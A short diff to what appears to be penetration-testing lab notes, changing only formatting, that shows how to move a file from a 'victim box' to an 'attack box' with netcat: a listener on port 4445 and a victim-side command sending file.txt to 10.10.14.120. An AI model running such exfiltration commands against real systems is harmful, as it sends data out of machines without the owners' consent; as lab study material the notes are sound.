@@ -6,14 +6,14 @@
 
 NC listener on attack box.
 
-nc -lvp 4445 > file.txt
+`nc -lvp 4445 > file.txt`
 
 ### Victim Box
 
-Initiate the transfer on the victim box. Use `-v 0` so that NC doesnt just sit there when the transfer is complete.
+Initiate the transfer on the victim box. Use -v 0 so that NC doesnt just sit there when the transfer is complete.
 
-cd /home/user1/
+`cd /home/user1/`
 
-nc -v 0 10.10.14.120 4445 < file.txt
+`nc -v 0 10.10.14.120 4445 < file.txt`
 
 
